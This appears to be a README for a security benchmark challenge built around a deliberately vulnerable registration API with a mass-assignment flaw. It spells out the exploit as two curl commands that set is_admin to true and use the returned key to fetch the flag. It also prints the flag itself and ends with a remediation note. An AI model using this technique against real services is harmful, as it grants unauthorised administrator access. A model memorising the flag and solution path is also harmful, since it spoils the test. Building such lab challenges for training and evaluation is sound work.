# aq-api-ben16 — AccountService mass assignment

## Vulnerability
- **Class:** Mass assignment
- **Category:** API6 / A04: Insecure Design
- **CWE:** CWE-915 (improperly controlled modification of attributes)

## Difficulty
medium — set a privileged field the client shouldn't control

## Description
A registration API that merges the whole request body onto the new account, including is_admin.

## Intended exploit path
1. Register with is_admin set to true.
2. `key=$(curl -s localhost:8316/api/register -H "Content-Type: application/json" -d '{"username":"x","is_admin":true}' | python3 -c "import sys,json;print(json.load(sys.stdin)['api_key'])")`
3. `curl -s localhost:8316/api/flag -H "X-Api-Key: $key"` returns the flag.

## Flag
`f13{mass_assignment_is_admin}` — from /api/flag for an admin account

## Run
```bash
./bench up aq-api-ben16
# open http://localhost:<host_port>/
./bench down aq-api-ben16
```

## Remediation
Bind only an explicit allowlist of client-settable fields; never merge the raw request body onto a model.
